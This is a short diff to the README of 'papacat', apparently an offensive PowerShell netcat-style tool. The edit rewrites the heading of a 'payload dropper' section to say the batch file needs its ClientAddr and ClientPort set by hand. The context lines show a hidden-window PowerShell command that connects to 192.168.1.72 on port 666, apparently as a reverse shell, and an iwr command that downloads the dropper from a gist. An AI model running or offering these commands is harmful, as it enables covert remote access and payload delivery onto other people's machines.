@@ -104,7 +104,7 @@ papacat -c 192.168.1.72 -ep -p 666 -v
 Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\papacat.ps1 -Force;papacat -c 192.168.1.72 -ep -p 666 -v";exit
 ```
 
-#### powershell Client (payload dropper)
+#### powershell Client (payload dropper) -- papacat.bat requires to be manual edited to chance the 'ClientAddr' and 'ClientPort' variables
 ```powershell
 iwr -uri "https://gist.githubusercontent.com/r00t-3xp10it/c328acda60dcfa5460888e957ba44e77/raw/b8cae4b3ede7dc78e20c06145c6941b4e622af64/papacat.bat" -OutFile "papacat.bat"
 ```
